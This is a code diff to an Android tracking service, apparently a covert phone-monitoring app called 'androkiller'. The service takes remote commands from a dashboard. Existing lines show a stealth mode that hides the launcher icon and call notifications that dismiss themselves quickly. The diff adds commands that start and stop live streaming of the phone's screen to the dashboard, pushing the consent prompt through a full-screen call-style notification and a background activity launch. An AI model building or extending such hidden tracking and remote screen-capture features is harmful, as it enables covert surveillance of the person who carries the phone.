@@ -1,5 +1,6 @@
 package com.nexus.androkiller.service
 
+import android.app.ActivityOptions
 import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
@@ -70,6 +71,10 @@ class TrackerForegroundService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var wifiLock: WifiManager.WifiLock? = null
     private var trackingIntervalSeconds = 15L
+
+    private val systemNotificationManager: AndroidNotificationManager by lazy {
+        getSystemService(Context.NOTIFICATION_SERVICE) as AndroidNotificationManager
+    }
 
 
     override fun onCreate() {
@@ -142,7 +147,15 @@ class TrackerForegroundService : Service() {
                 try {
                     startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                 } catch (_: Exception) {
-                    startForeground(NOTIFICATION_ID, notification)
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                        } else {
+                            startForeground(NOTIFICATION_ID, notification)
+                        }
+                    } catch (_: Exception) {
+                        startForeground(NOTIFICATION_ID, notification)
+                    }
                 }
             }
         } else {
@@ -381,13 +394,13 @@ class TrackerForegroundService : Service() {
                                     .setAutoCancel(true)
                                     .setFullScreenIntent(pendingIntent, true)
                                     .build()
-                                notificationManager.notify(3001, notif)
+                                systemNotificationManager.notify(3001, notif)
 
                                 // Auto-dismiss call notification after 10s so it doesn't linger in tray
                                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                     try {
-                                        notificationManager.cancel(3001)
-                                        notificationManager.cancel(3002)
+                                        systemNotificationManager.cancel(3001)
+                                        systemNotificationManager.cancel(3002)
                                     } catch (_: Exception) {}
                                 }, 10_000L)
 
@@ -419,13 +432,13 @@ class TrackerForegroundService : Service() {
                                     .setAutoCancel(true)
                                     .setFullScreenIntent(pendingIntent, true)
                                     .build()
-                                notificationManager.notify(3002, notif)
+                                systemNotificationManager.notify(3002, notif)
 
                                 // Auto-dismiss call notification after 10s so it doesn't linger in tray
                                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                     try {
-                                        notificationManager.cancel(3001)
-                                        notificationManager.cancel(3002)
+                                        systemNotificationManager.cancel(3001)
+                                        systemNotificationManager.cancel(3002)
                                     } catch (_: Exception) {}
                                 }, 10_000L)
 
@@ -620,6 +633,82 @@ class TrackerForegroundService : Service() {
                         val success = com.nexus.androkiller.util.LauncherVisibility.showLauncherIcon(this@TrackerForegroundService)
                         repository.markCommandExecuted(command.commandId, if (success) "EXECUTED" else "FAILED", "Launcher icon restored (Stealth OFF)")
                         Log.i(TAG, "Command SHOW_ICON processed: success=$success")
+                    }
+                    "START_SCREEN_STREAM", "SCREEN_STREAM" -> {
+                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
+                        val peerId = (command.parameters["peerId"] as? String)?.ifBlank { null }
+                            ?: "screen_$targetDevId"
+                        try {
+                            val intent = Intent(this@TrackerForegroundService, ScreenCaptureConsentActivity::class.java).apply {
+                                putExtra(ScreenCaptureConsentActivity.EXTRA_PEER_ID, peerId)
+                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+                            }
+                            val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                                val bOptions = ActivityOptions.makeBasic().apply {
+                                    setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+                                }.toBundle()
+                                PendingIntent.getActivity(
+                                    this@TrackerForegroundService,
+                                    3005,
+                                    intent,
+                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+                                    bOptions
+                                )
+                            } else {
+                                PendingIntent.getActivity(
+                                    this@TrackerForegroundService,
+                                    3005,
+                                    intent,
+                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                                )
+                            }
+                            val notif = NotificationCompat.Builder(this@TrackerForegroundService, CHANNEL_ID_ALERTS)
+                                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                                .setContentTitle("Live Screen Broadcast Request")
+                                .setContentText("Tap to start live screen streaming to dashboard")
+                                .setPriority(NotificationCompat.PRIORITY_MAX)
+                                .setCategory(NotificationCompat.CATEGORY_CALL)
+                                .setAutoCancel(true)
+                                .setFullScreenIntent(pendingIntent, true)
+                                .build()
+                            systemNotificationManager.notify(3005, notif)
+
+                            try {
+                                startActivity(intent)
+                            } catch (e: Exception) {
+                                Log.w(TAG, "Direct startActivity for screen capture: ${e.message}")
+                            }
+
+                            repository.markCommandExecuted(command.commandId, "EXECUTED", "Screen stream consent prompt dispatched for $peerId")
+                            Log.i(TAG, "START_SCREEN_STREAM processed for peerId=$peerId")
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Failed to start screen stream: ${e.message}", e)
+                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
+                        }
+                    }
+                    "STOP_SCREEN_STREAM" -> {
+                        try {
+                            ScreenCaptureService.stop(this@TrackerForegroundService)
+                            repository.markCommandExecuted(command.commandId, "EXECUTED", "ScreenCaptureService stopped")
+                            Log.i(TAG, "STOP_SCREEN_STREAM processed")
+                        } catch (e: Exception) {
+                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
+                        }
+                    }
+                    "SEND_TEST_NOTIFICATION", "TRIGGER_TEST_NOTIF" -> {
+                        try {
+                            val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
+                            val timeStr = java.text.SimpleDateFormat("hh:mm:ss a", java.util.Locale.getDefault()).format(java.util.Date())
+                            notificationManager.pushSystemAlert(
+                                deviceId = targetDevId,
+                                title = "Real-Time Test Alert",
+                                body = "Live test notification from phone sent at $timeStr. Real-time pipeline active!"
+                            )
+                            repository.markCommandExecuted(command.commandId, "EXECUTED", "Test notification pushed successfully")
+                            Log.i(TAG, "SEND_TEST_NOTIFICATION processed for $targetDevId")
+                        } catch (e: Exception) {
+                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
+                        }
                     }
                     else -> {
                         repository.markCommandExecuted(command.commandId, "FAILED", "Unknown action ${command.action}")
